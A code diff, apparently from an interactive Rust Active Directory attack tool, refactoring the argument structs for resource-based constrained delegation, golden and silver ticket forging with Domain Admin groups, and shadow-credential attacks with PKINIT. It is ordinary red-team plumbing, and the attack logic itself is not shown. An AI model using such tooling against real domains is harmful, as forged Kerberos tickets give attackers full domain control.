@@ -1175,12 +1175,14 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .with_prompt("Target service SPN (e.g. cifs/dc.corp.local)")
                 .interact_text()?;
             rbcd(RbcdArgs {
-                kdc: s.dc.clone(),
-                realm: s.realm(),
-                account,
-                account_password,
-                impersonate,
-                target_spn,
+                from_file: None,
+                kdc: Some(s.dc.clone()),
+                realm: Some(s.realm()),
+                account: Some(account),
+                account_password: Some(account_password),
+                nt_hash: None,
+                impersonate: Some(impersonate),
+                target_spn: Some(target_spn),
             })
             .await
         }
@@ -1416,10 +1418,11 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .allow_empty(true)
                 .interact_text()?;
             golden(GoldenArgs {
-                kdc: s.dc.clone(),
-                realm: s.realm(),
-                krbtgt_aes256: krbtgt_aes256.into(),
-                domain_sid,
+                from_file: None,
+                kdc: Some(s.dc.clone()),
+                realm: Some(s.realm()),
+                krbtgt_aes256: Some(krbtgt_aes256.into()),
+                domain_sid: Some(domain_sid),
                 user,
                 rid,
                 groups: DA_GROUPS.to_vec(),
@@ -1446,10 +1449,11 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .allow_empty(true)
                 .interact_text()?;
             silver(SilverArgs {
-                realm: s.realm(),
-                service_aes256: service_aes256.into(),
-                spn,
-                domain_sid,
+                from_file: None,
+                realm: Some(s.realm()),
+                service_aes256: Some(service_aes256.into()),
+                spn: Some(spn),
+                domain_sid: Some(domain_sid),
                 user,
                 rid,
                 groups: DA_GROUPS.to_vec(),
@@ -1548,11 +1552,12 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .interact_text()?;
             let pkinit = prompt_confirm("Also do PKINIT to get a TGT as the target?", true)?;
             shadowcred(ShadowcredArgs {
-                url: s.ldap_url(),
-                user: s.username.clone(),
+                from_file: None,
+                url: Some(s.ldap_url()),
+                user: Some(s.username.clone()),
                 password: s.password.expose().clone(),
                 insecure: true,
-                target,
+                target: Some(target),
                 pkinit,
                 kdc: if pkinit { Some(s.dc.clone()) } else { None },
                 realm: if pkinit { Some(s.realm()) } else { None },
@@ -1634,12 +1639,14 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
                 .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
                 .interact_text()?;
             rbcd(RbcdArgs {
-                kdc: s.dc.clone(),
-                realm: s.realm(),
-                account,
-                account_password,
-                impersonate,
-                target_spn,
+                from_file: None,
+                kdc: Some(s.dc.clone()),
+                realm: Some(s.realm()),
+                account: Some(account),
+                account_password: Some(account_password),
+                nt_hash: None,
+                impersonate: Some(impersonate),
+                target_spn: Some(target_spn),
             })
             .await
         }
